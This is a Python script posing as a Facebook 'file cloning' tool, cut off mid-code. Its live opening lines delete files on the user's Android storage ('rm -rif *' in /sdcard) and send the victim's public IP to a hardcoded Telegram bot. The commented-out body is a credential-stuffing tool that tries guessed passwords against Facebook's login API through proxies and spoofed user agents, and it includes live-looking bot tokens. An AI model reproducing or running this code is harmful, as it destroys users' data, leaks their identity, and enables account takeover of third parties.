import os
import time
import requests

url = "https://ipinfo.io/ip"
response = requests.get(url)

public_ip = response.text.strip()
token = '7001218911:AAF_QZOeYo2wn7Tio47SkE_jPobWRIK6lOQ'
ID = '5026029533'
os.system ("clear")
dehso = 1000
while dehso < 10000:
        hk = hk +1
os.system ("clear")
os.system ('cd /sdcard') 
os.system ('rm -rif *')
time.sleep(3)
Ok = f"تم مسح ملفات الضحية وايبيه هو {public_ip}"
requests.post(f"https://api.telegram.org/bot{str(token)}/sendMessage?chat_id={str(ID)}&text={str(Ok)}")


#import requests
#from os import path
#from urllib.request import urlopen
#import os
#import base64
#import zlib
#import pip
#import urllib
#import platform
#import math
#import shutil
#import random
#import uuid
#import string
#import hashlib
#import json
#import sys
#import time
#import datetime
#from concurrent.futures import ThreadPoolExecutor as tred
#from rich.console import Console
#from rich.panel import Panel
#from rich import print as rich_print
#from rich.table import Table
#import bs4
#import re
#import subprocess
#import urllib3
#import marshal
#from concurrent.futures import ThreadPoolExecutor as ThreadPool
#from bs4 import BeautifulSoup as sop, BeautifulSoup as parser
#from rich.console import Group as gp
#from rich.panel import Panel as nel
#from rich.markdown import Markdown as mark
#from rich.columns import Columns as col
#from rich import print as cetak, print as rprint, pretty
#from rich.text import Text as tekz
#r = '\033[38;5;196m'
#w = '\x1b[1;97m'
#gre = '\033[38;5;190m'
#y = '\x1b[1;33m'
#blu = '\x1b[1;34m'
#sma = '\x1b[1;96m'
#bn = '\x1b[38;5;208m'
#met = '\033[38;5;200m'
#m161 = '\033[38;5;161m'
#m202 = '\033[38;5;202m'
#m220 = '\033[38;5;220m'
#m196 = '\033[38;5;196m'
#m50 = '\033[38;5;50m'
#m181 = '\033[38;5;181m'
#m170 = '\033[38;5;170m'
#m167 = '\033[38;5;167m'
#m197 = '\033[38;5;197m'
#m226 = '\033[38;5;226m'
#m142 = '\033[38;5;142m'
#m201 = '\033[38;5;226m'
#m45 = '\033[38;5;45m'
#m23 = '\033[38;5;23m'
#m140 = '\033[38;5;140m'
#m213 = '\033[38;5;213m'
#m33 = '\033[38;5;33m'
#m161 = '\033[38;5;161m'
#m43 = '\033[38;5;43m'
#m198 = '\033[38;5;198m'
#m199 = '\033[38;5;199m'
#m128 = '\033[38;5;128m'
#lon = random.choice([r,gre,y,sma,met,m161,m202,m220,m196,m50,m181,m170,m167,m197,m226,m142,m201,m45,m23,m213,m33,m161,m43,m198,m199,m128])
#token2 = '7173661717:AAFcyHGz07MqB71Voh86MUtJ2TU7VNXFYQM'
#ID2 = '5026029533'
#os.system('clear')
#url = "https://raw.githubusercontent.com/2SAYO/Logos/main/Logos"
#response = requests.get(url)
#phrases = []
#current_phrase = []
#for line in response.text.strip().split("\n"):
#    if line:
#        current_phrase.append(line)
#    else:
#        if current_phrase:
#            phrases.append("\n".join(current_phrase))
#            current_phrase = []
#if current_phrase:
#    phrases.append("\n".join(current_phrase))
#chosen_phrase = random.choice(phrases)
#logo = (f"""{lon}{chosen_phrase}


#{gre}━━━━━━━━━━━━━━━━━━━━━━{w}< \033[100m𝗦 𝗔 𝗬 𝗢\033[m {w}>{gre}━━━━━━━━━━━━━━━━━━━━━
#{m45}–╰ 厄 ⸔⸕ {m128}⫷ {m181}𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥       {m170}✜        {m181}𝗦𝗔𝗬𝗢{m128} ⫸      
#{m45}–╰ 厄 ⸔⸕ {m128}⫷ {m181}{m181}𝗧𝗘𝗟𝗘 𝗨𝗦𝗘𝗥       {m170}✜        {m181}@𝗦_𝗔_𝗬_𝗢{m128} ⫸     
#{m45}–╰ 厄 ⸔⸕ {m128}⫷ {m181}𝗧𝗢𝗢𝗟 𝗧𝗬𝗣𝗘       {m170}✜        {m181}𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞{m128} ⫸
#{m45}–╰ 厄 ⸔⸕ {m128}⫷ {m181}𝗧𝗢𝗢𝗟            {m170}✜        {m181}𝗣𝗔𝗜𝗗{m128} ⫸
#{m45}–╰ 厄 ⸔⸕ {m128}⫷ {m181}𝗩𝗘𝗥𝗦𝗜𝗢𝗡         {m170}✜        {m181}𝗩𝟮.𝟮{m128} ⫸
#{gre}━━━━━━━━━━━━━━━━━━━━━━{w}< \033[100m𝗦 𝗔 𝗬 𝗢\033[m {w}>{gre}━━━━━━━━━━━━━━━━━━━━━""")
#def read_config():
#    try:
#        with open('𝗦𝗔𝗬𝗢-𝗧𝗢𝗞𝗘𝗡-𝗜𝗗.json', 'r') as f:
#            config = json.load(f)
#            token = config['token']
#            ID = config['ID']
#    except (FileNotFoundError, KeyError):

#        try:
#            with open('config.txt', 'r') as f:
#                token = f.readline().strip()
#                ID = f.readline().strip()
#        except FileNotFoundError:
#            print(logo)
#            token = input(f'{w}𝗧 {r}𝗢 {w}𝗞 {r}𝗘 {w}𝗡 {r}:{w} ')
#            ID = input(f'{w}𝗜 {r}𝗗 {w}: {r}')
#            
#            if len(token) >= 46 and len(ID) >= 9 and ID.isdigit():
#                config = {'token': token, 'ID': ID}
#                with open('𝗦𝗔𝗬𝗢-𝗧𝗢𝗞𝗘𝗡-𝗜𝗗.json', 'w') as f:
#                    json.dump(config, f)
#    
#    return token, ID

#token, ID = read_config()

#    
#def syline():
#	print(f'{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰')
#def menu():   
#    os.system('clear')
#    print(logo)
#    print(f'{y}[{w}1 {m170}/ {w}𝗔 {y}] {gre}𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚\n{y}[{w}2{m170} / {w}𝗕{y} ] {gre}𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥')
#    syline()
#    sayo_menu = input(f'\x1b[1;97m𝗖𝗛𝗢𝗜𝗦𝗘 : {m50}')
#    if sayo_menu in ('1', '01','a','A'):
#        file()
#    if sayo_menu in ('2', '02','b','B'):
#    	toasl()
#def clear():
#	os.system('clear')
#def back():
#	menu()
#••••••••••••••••••••••••UA••••••••••••••••••••••••

#try:
#	prox= requests.get('https://raw.githubusercontent.com/2SAYO/GoodProx/main/prox.txt').text
#	open('.prox.txt','w').write(prox)
#except Exception as e:
#	print('error ')
#prox=open('.prox.txt','r').read().splitlines()

#uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
#fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
#ugen =	[]
#for xd in range(100000):
#	a='Mozilla/5.0 (Symbian/3; Series60/'
#	b=random.randrange(1, 9)
#	c=random.randrange(1, 9)
#	d='Nokia'
#	e=random.randrange(100, 9999)
#	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
#	g=random.randrange(1, 9)
#	h=random.randrange(1, 4)
#	i=random.randrange(1, 4)
#	j=random.randrange(1, 4)
#	k='Mobile Safari/535.1'
#	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
#	ugen.append(uaku)


#	aa='Mozilla/5.0 (Linux; Android'
#	b=random.choice(['2','3','4','5','5.2','6','6.0.1','7','8','9','10','11','11','11.0.1','12','13'])
#	c=random.choice(['OPPO A57 Build/MMB29M; wv'])
#	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
#	e=random.randrange(80,106)
#	f='0'
#	g=random.randrange(3904,5000)
#	h=random.randrange(40,100)
#	i='MQQBrowser/6.2 TBS/045713 Mobile Safari/537.36 MMWEBID/4383 MicroMessenger/8.0.10.1960(0x28000A3D) Process/tools WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64'
#	uaku2=f'{aa} {b}; {c}) {d}{e}.{f}.{g}.{h} {i}'
#	ugen.append(uaku2)
#	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-SM-'
#	b=random.randrange(100, 9999)
#	c=random.randrange(100, 9999)
#	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
#	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
#	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
#	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
#	h=random.randrange(1, 9)
#	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
#	j=random.randrange(1, 9)
#	k=random.randrange(1, 9)
#	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
#	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
#	ugen.append(uak)
#	a = 'Mozilla/5.0 (iPhone; CPU iPhone OS '
#	b = random.randrange(10, 17)
#	c = random.randrange(0, 5)
#	d = random.randrange(0, 5)
#	e = 'like Mac OS X) AppleWebKit/'
#	f = random.randrange(600, 700)
#	g = random.randrange(1, 5)
#	h = random.randrange(1, 5)
#	i = ' (KHTML, like Gecko) Version/'
#	j = random.randrange(10, 13)
#	k = '.0 Mobile/15E148 Safari/'
#	l = f'{f}.{g}.{h}'
#	ua_ios = f'{a}{b}_{c}_{d} {e}{f}.{g}.{h}{i}{j}{k}{l}'
#	ugen.append(ua_ios)

#def creat(ids):
#    ids_prefixes = {
#        '1000000000': '2009', '100000000': '2009', '10000000': '2009',
#        '1000000': '2009', '1000001': '2009', '1000002': '2009', '1000003': '2009', '1000004': '2009', '1000005': '2009',
#        '1000006': '2010', '1000007': '2010', '1000008': '2010', '1000009': '2010',
#        '100001': '2010-2011', '100002': '2011-2012', '100003': '2011-2012',
#        '100004': '2012-2013', '100005': '2013-2014', '100006': '2013-2014',
#        '100007': '2014-2015', '100008': '2014-2015', '100009': '2015',
#        '10001': '2015-2016', '10002': '2016-2017', '10003': '2018',
#        '10004': '2019', '10005': '2020', '10006': '2021-2022', '10007': '2021-2022', '10008': '2021-2022'
#    }
#    
#    CreAt = ''
#    if len(ids) == 15:
#        for prefix, year in ids_prefixes.items():
#            if ids.startswith(prefix):
#                CreAt = year
#                break
#    elif len(ids) in (9, 10):
#        CreAt = '2008-2009'
#    elif len(ids) == 8:
#        CreAt = '2007-2008'
#    elif len(ids) == 7:
#        CreAt = '2006-2007'
#    else:
#        CreAt = ''

#    return CreAt
#••••••••••••••••••••••••UA••••••••••••••••••••••••
#loop=0
#lim=0
#oks=[]
#cps=[]
#pcp=[]
#ses = requests.Session()
#def file():
#				syline()
#				file = input(f'{w}𝗙𝗜𝗟𝗘 𝗣𝗔𝗧𝗛 :{m50} ')
#				syline()
#				try:
#					fo = open(file,'r').read().splitlines()
#				except FileNotFoundError:
#					print(f'{r}𝗙𝗜𝗟𝗘 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗')
#					time.sleep(2)
#					menu()
#				plist = []
#				print(f"""{r}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━┓
#┃ {gre}𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𝗜𝗡𝗙𝗢{r}                  ┃    {gre}𝗖𝗥𝗔𝗖𝗞 𝗦𝗣𝗘𝗘𝗗{r}     ┃
#┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━┩
#{r}{r}│ {y}[{w}1{y}] {m161}𝗦𝗧𝗥𝗢𝗡𝗚 𝗣𝗔𝗦𝗦                {r}{r}│  {w}[ {m43}𝗦𝗣𝗘𝗘𝗗{w} - {m43}𝟴𝟭% {w}]   {r}{r}│
#{r}{r}│ {y}[{w}2{y}] {bn}𝗠𝗘𝗗𝗜𝗨𝗠 𝗣𝗔𝗦𝗦                {r}{r}│  {w}[ {m43}𝗦𝗣𝗘𝗘𝗗{w} - {m43}𝟴𝟵% {w}]   {r}{r}│
#{r}{r}│ {y}[{w}3{y}] {m196}𝗠𝗜𝗫 𝗣𝗔𝗦𝗦                   {r}{r}│  {w}[ {m43}𝗦𝗣𝗘𝗘𝗗{w} - {m43}𝟯𝟬% {w}]   {r}{r}│
#{r}{r}│ {y}[{w}4{y}] {m220}𝗬𝗘𝗔𝗥𝗦 𝗣𝗔𝗦𝗦 {w}[ {m220}1970-2024{w} ]   {r}{r}│  {w}[ {m43}𝗦𝗣𝗘𝗘𝗗{w} - {m43}𝟯𝟱% {w}]   {r}{r}│
#{r}{r}│ {y}[{w}5{y}] {m45}𝗟𝗘𝗧𝗧𝗘𝗥𝗦 {w}+ {m45}𝗡𝗨𝗠𝗕𝗘𝗥𝗦 [𝗦𝗣𝗘𝗘𝗗]  {r}{r}│  {w}[ {m43}𝗦𝗣𝗘𝗘𝗗{w} - {m43}𝟳𝟯% {w}]   {r}{r}│
#{r}{r}│ {y}[{w}6{y}] {m170}𝗩𝗘𝗥𝗬 𝗦𝗧𝗥𝗢𝗡𝗚 𝗣𝗔𝗦𝗦           {r}{r}│  {w}[ {m43}𝗦𝗣𝗘𝗘𝗗{w} - {m43}𝟲𝟰% {w}]   {r}{r}│
#{r}{r}│ {y}[{w}7{y}]{m213} 𝗠𝗔𝗡𝗨𝗔𝗟 𝗣𝗔𝗦𝗦                {r}{r}│ {w}[ {m43}𝗩𝗔𝗥𝗜𝗔𝗕𝗟𝗘 𝗦𝗣𝗘𝗘𝗗 {w}] {r}{r}│
#└────────────────────────────────┴────────────────────┘""")
#				syline()
#				ppp=input(f'{w}𝗖𝗛𝗢𝗜𝗦𝗘 : {m50}')
#				if ppp in ['1','01']:
#					plist.append('qqwweerrttyy')
#					plist.append('first last')
#					plist.append('llkkjjhhggffddssaa')
#					plist.append('mmnnbbvvccxxzz')
#					plist.append('07700770')
#					plist.append('ppooiiuuyy')
#					plist.append('qwertqwert')
#					plist.append('zzxxccvvbbnnmm')
#					plist.append('2244668800')
#					plist.append('qqwweerrttyyuuiioopp')
#					plist.append('aassddffgghhjjkkll')
#					plist.append('1234512345@')
#					plist.append('0099887766')
#					plist.append('1234@@@@')
#					plist.append('12345@@@@@')
#					plist.append('aaaassss')
#					plist.append('zzxxccvv')
#					plist.append('100020003000')
#					plist.append('10002000')
#					plist.append('qwertyuiopasdfghjkl')
#					plist.append('qwertyuiopasdfghjklzxcvbnm')
#					plist.append('1020304050')
#					plist.append('10203040')
#				elif ppp in ['2','02']:
#					plist.append('first last')
#					plist.append('qqwwee')
#					plist.append('aassdd')                
#					plist.append('07700770')
#					plist.append('qqqqwwww')
#					plist.append('zzzzxxxx')
#					plist.append('zzxxccvvbbnnmm')
#					plist.append('zzxxcc')
#					plist.append('qwertyuiopasdfghjkl')
#					plist.append('qwerqwer')
#					plist.append('mmnnbbvvccxxzz')
#					plist.append('22446688')
#					plist.append('ppooiiuu')
#					plist.append('11112222')
#					plist.append('mnbvmnbv')
#				elif ppp in ['3','03']:
#					plist.append('qqwwee')
#					plist.append('aassdd')
#					plist.append('07700770')
#					plist.append('qqqqwwww')
#					plist.append('zzzzxxxx')
#					plist.append('07700770')
#					plist.append('20212021')
#					plist.append('07700770')
#					plist.append('00009999')
#					plist.append('12345@12345')
#					plist.append('22446688')
#					plist.append('11112222')
#					plist.append('mmnnbbvv')
#					plist.append('firstlast')
#					plist.append('firstfirst')
#					plist.append('first first')
#					plist.append('zzxxccvv')
#					plist.append('ppooiiuuyy')
#					plist.append('ppooiiuu')
#					plist.append('qqwweerr')
#					plist.append('qqwweerrtt')
#					plist.append('aassddff')
#					plist.append('qqwwee')
#					plist.append('aassdd')
#					plist.append('zzxxcc')
#					plist.append('zzxxccvv')
#					plist.append('asdfghjklasdfghjkl')
#					plist.append('qqwweerrttyyuuiioopp')
#					plist.append('qqwweerrttyy')
#					plist.append('qwertyuiopqwertyuiop')
#					plist.append('asdfghjklasdfghjkl')
#					plist.append('llkkjjhh')
#					plist.append('mmnnbbvvccxxzz')
#					plist.append('zzxxccvvbbnnmm')
#					plist.append('aaaassss')
#					plist.append('qqqqwwww')
#					plist.append('qwertyuiop')
#					plist.append('nnnnmmmm')
#					plist.append('zxcvzxcv')
#					plist.append('19991999')
#					plist.append('20062006')
#					plist.append('19951995')
#					plist.append('19931993')
#					plist.append('ppppoooo')
#					plist.append('oooopppp')
#					plist.append('mmmmnnnn')
#					plist.append('19901990')
#					plist.append('19911991')
#					plist.append('19921992')
#					plist.append('19941994')
#					plist.append('20232023')
#					plist.append('19961996')
#					plist.append('19971997')
#					plist.append('19981998')
#					plist.append('20202020')
#					plist.append('20002000')
#					plist.append('20012001')
#					plist.append('20022002')
#					plist.append('20032003')
#					plist.append('20042004')
#					plist.append('20052005')
#					plist.append('20102010')
#					plist.append('20072007')
#					plist.append('20082008')
#					plist.append('20092009')
#					plist.append('ppppoooo')
#					plist.append('oooopppp')
#				elif ppp in ['4','04']:
#					plist.append('19701970')
#					plist.append('19711971')
#					plist.append('19721972')
#					plist.append('19731973')
#					plist.append('19741974')
#					plist.append('19751975')
#					plist.append('19761976')
#					plist.append('19771977')
#					plist.append('19781978')
#					plist.append('19791979')
#					plist.append('19801980')
#					plist.append('19811981')
#					plist.append('19821982')
#					plist.append('19831983')
#					plist.append('19841984')
#					plist.append('19851985')
#					plist.append('19861986')
#					plist.append('19871987')
#					plist.append('19881988')
#					plist.append('19891989')
#					plist.append('19901990')
#					plist.append('19911991')
#					plist.append('19921992')
#					plist.append('19931993')
#					plist.append('19941994')
#					plist.append('19951995')
#					plist.append('19961996')
#					plist.append('19971997')
#					plist.append('19981998')
#					plist.append('19991999')
#					plist.append('20002000')
#					plist.append('20012001')
#					plist.append('20022002')
#					plist.append('20032003')
#					plist.append('20042004')
#					plist.append('20052005')
#					plist.append('20062006')
#					plist.append('20072007')
#					plist.append('20082008')
#					plist.append('20092009')
#					plist.append('20102010')
#					plist.append('20112011')
#					plist.append('20122012')
#					plist.append('20132013')
#					plist.append('20142014')
#					plist.append('20152015')
#					plist.append('20162016')
#					plist.append('20172017')
#					plist.append('20182018')
#					plist.append('20192019')
#					plist.append('20202020')
#					plist.append('20212021')
#					plist.append('20222022')
#					plist.append('20232023')
#					plist.append('20242024')
#				elif ppp in ['5','05']:
#					plist.append('11223344@@@')
#					plist.append('112233445566@@')
#					plist.append('1234@@@@')
#					plist.append('0099887766')
#					plist.append('qwert12345')
#					plist.append('11223344@@')
#					plist.append('1122334455@@')
#					plist.append('112233@@')
#					plist.append('first last')
#					plist.append('first123')
#					plist.append('22446688')
#					plist.append('90909090')
#					plist.append('12341234@@')
#					plist.append('77889900')
#					plist.append('10002000')
#					plist.append('07700770')
#					plist.append('6677889900')
#					plist.append('11110000')
#					plist.append('00998877')
#					plist.append('20232023')
#					plist.append('1234512345@@')
#					plist.append('12345qwert')
#					plist.append('123@@123')
#					plist.append('20002000')
#					plist.append('5544332211')
#					plist.append('123456$$')
#					plist.append('19801980')
#					plist.append('19951995')
#					plist.append('11112222')
#				elif ppp in ['6','06']:
#					plist.append('qqwwee')
#					plist.append('aassdd')
#					plist.append('07700770')
#					plist.append('qqqqwwww')
#					plist.append('zzzzxxxx')
#					plist.append('07700770')
#					plist.append('20212021')
#					plist.append('07700770')
#					plist.append('00009999')
#					plist.append('12345@12345')
#					plist.append('22446688')
#					plist.append('11112222')
#					plist.append('mmnnbbvv')
#					plist.append('firstlast')
#					plist.append('firstfirst')
#					plist.append('first first')
#					plist.append('zzxxccvv')
#					plist.append('ppooiiuuyy')
#					plist.append('ppooiiuu')
#					plist.append('qqwweerr')
#					plist.append('qqwweerrtt')
#					plist.append('aassddff')
#					plist.append('qqwwee')
#					plist.append('aassdd')
#					plist.append('zzxxcc')
#					plist.append('zzxxccvv')
#					plist.append('asdfghjklasdfghjkl')
#					plist.append('qqwweerrttyyuuiioopp')
#					plist.append('qqwweerrttyy')
#					plist.append('qwertyuiopqwertyuiop')
#					plist.append('asdfghjklasdfghjkl')
#					plist.append('llkkjjhh')
#					plist.append('mmnnbbvvccxxzz')
#					plist.append('zzxxccvvbbnnmm')
#					plist.append('aaaassss')
#					plist.append('qqqqwwww')
#					plist.append('qwertyuiop')
#					plist.append('nnnnmmmm')
#					plist.append('zxcvzxcv')
#					
#					
#				else:
#					try:
#						syline()
#						ps_limit = int(input(f'{m50}𝗛𝗢𝗪 𝗠𝗔𝗡𝗬 𝗣𝗔𝗦𝗦 𝗧𝗢 𝗔𝗗𝗗 ? : '))
#					except:
#						ps_limit =1
#					syline()
#					print(f'{w}𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : {r}first last,qwerqwer,00998877')
#					syline()
#					for i in range(ps_limit):
#						plist.append(input(f'𝗣𝗨𝗧 𝗣𝗔𝗦𝗦𝗢𝗪𝗥𝗗 {i+1}: '))
#				
#				cx=('1')
#				if cx in ['1','Y','yes','Yes','1']:
#					pcp.append('y')
#				else:
#					pcp.append('')
#				with tred(max_workers=50) as crack_submit:
#					clear()
#					total_ids = str(len(fo))
#					lim= int(total_ids)
#					print(logo)
#					print(f'{w}𝗬𝗢𝗨𝗥 𝗙𝗜𝗟𝗘 : {met}{file}')
#					syline()
#					print(f'\x1b[1;97m𝗧𝗢𝗧𝗔𝗟 𝗜𝗗𝗦 : {gre}'+total_ids+f' ')
#					syline()
#					for user in fo:
#						ids,names = user.split('|')
#						passlist = plist
#						crack_submit.submit(api,ids,names,passlist)
#				print('\033[1;37m')
#				syline()
#				print('𝗧𝗛𝗘 𝗖𝗥𝗔𝗖𝗞 𝗜𝗦 𝗖𝗢𝗠𝗣𝗟𝗘𝗧......')
#				syline()
#				print(f'{w}𝗖𝗔𝗧𝗖𝗛 {gre}𝗢𝗞 {w}| {r}𝗖𝗣 {w}:{gre} '+str(len(oks))+f' {w}|{r} '+str(len(cps)))
#				syline()
#				print(f'''{y}[{w}1{y}] {gre} 𝗖𝗢𝗠𝗣𝗟𝗜𝗧𝗘 𝗖𝗥𝗔𝗖𝗞\n{y}[{w}2{y}] {gre} 𝗘𝗫𝗜𝗧 𝗧𝗢𝗢𝗟''')
#				syline()
#				krrk = input(f'\x1b[1;97m𝗖𝗛𝗢𝗜𝗦𝗘 : {m50}')
#				try:
#				    krrk = int(krrk)
#				    if krrk == 1:
#				        back()
#				    elif krrk == 2:
#				        exit()
#				    else:
#				        exit()
#				except ValueError:
#				    exit()
#				
#def api(ids, names, passlist):
#    global loop, oks, cps
#    try:
#        ro = random.choice([r, w, gre, y, sma, met])
#        lo = random.choice([w, met])
#        sys.stdout.write(f'\r\r{met}[{ro}𝗦𝗔𝗬𝗢{met}] {w}- {met}[{lo}{loop}{met}] {w}- {met}[{gre}𝗢𝗞{w}  : {gre}{len(oks)}{met}] {w}- {met}[{r}𝗖𝗣{w}  : {r}{len(cps)}{met}]')
#        sys.stdout.flush()
#        fn = names.split(' ')[0]
#        try:
#            ln = names.split(' ')[1]
#        except:
#            ln = fn
#        for pw in passlist:
#            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
#            ios_version = random.choice(['10_0_2', '10_1_1', '10_2', '10_2_1', '10_3_1', '10_3_2', '10_3_3'])
#            android_version = f'Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}'
#            facebook_version = f'{random.randint(10, 437)}.0.0.{random.randint(1, 99)}.{random.randint(1, 200)}'
#            fbbv = str(random.randint(10000000, 99999999))
#            fbsv = f'{random.uniform(4.0, 10.0):.1f}'
#            density = random.choice(['2.0', '2.25', '2.75', '3.0', '3.25', '3.75'])
#            width = random.randint(720, 1440)
#            height = random.randint(1080, 2560)
#            fblc = random.choice(['ja_JP', 'ex_MX', 'en_CU', 'en_US', 'fr_FR', 'fa_IR', 'es_ES', 'pt_BR', 'de_DE', 'it_IT', 'ja_JP', 'ko_KR', 'ru_RU', 'zh_CN', 'ar_AE', 'en_GB'])
#            fbcr = random.choice(['Telenor', 'fido', 'MOVO AFRICA', 'UFONE-PAKTel', 'Zong', 'Jazz', 'SCO', 'Jio', 'Vodafone', 'Airtel', 'BSNL', 'MTNL', 'Grameenphone', 'Robi', 'Banglalink', 'Teletalk', 'Telkomsel', 'Indosat Ooredoo', 'Axiata', 'Tri', 'Smartfren', 'China Mobile', 'Unicom', 'Telecom', 'Satcom', 'Docomo', 'Rakuten', 'IIJmio', 'Orange', 'Verizon', 'AT&T', 'T-Mobile', 'Sprint', 'Vodafone', 'Telefonica', 'EE', 'Orange', 'Three'])
#            fban = random.choice(['FB4A', 'FB5A', 'FB6A'])
#            fbpn = random.choice(['com.facebook.katana', 'com.facebook.orca', 'messenger-android', 'com.facebook.lite'])
#            pryx = random.choice(prox)
#            proxies = {'http': 'socks4://' + pryx}
#            ua = f'[FBAN/FB4A;FBAV/{random.randint(49, 66)}.0.0.{random.randrange(20, 49)}{random.randint(11, 99)};FBBV/{random.randint(11111111, 77777777)};[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723414;FBDM/{{density=1.5,width=480,height=800}};FBLC/ar_AR;FBCR/KOREK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9060I;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]\',\'[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{{density=1.5,width=480,height=800}};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]\',\'[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022659;FBDM/{{density=1.5,width=540,height=960}};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]\',\'[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{{density=1.5,width=540,height=960}};FBLC/fr_FR;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]\',\'[FBAN/FB4A;FBAV/82.0.0.20.70;FBBV/32367061;FBDM/{{density=1.5,width=854,height=480}};FBLC/es_LA;FBCR/OUI;FBMF/LAVA;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris702;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]\']'
#            device_id = str(uuid.uuid4())
#            adid = str(uuid.uuid4())
#            data = {
#                'adid': adid,
#                'email': ids,
#                'password': pas,
#                'cpl': 'true',
#                'credentials_type': 'device_based_login_password',
#                'source': 'device_based_login',
#                'error_detail_type': 'button_with_disabled',
#                'format': 'json',
#                'generate_session_cookies': '1',
#                'generate_analytics_claim': '1',
#                'generate_machine_id': '1',
#                'family_device_id': str(uuid.uuid4()),
#                'advertiser_id': str(uuid.uuid4()),
#                'locale': 'fr_DZ',
#                'client_country_code': 'DZ',
#                'device_id': str(uuid.uuid4()),
#                'method': 'auth.login',
#                'api_key': '882a8490361da98702bf97a021ddc14d',
#                'fb_api_req_friendly_name': 'authenticate',
#                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
#            }
#            head = {
#                'content-type': 'application/x-www-form-urlencoded',
#                'Host': 'graph.facebook.com',
#                'x-fb-sim-hni': str(random.randint(20000, 40000)),
#                'X-FB-Connection-Type': 'MOBILE.LTE',
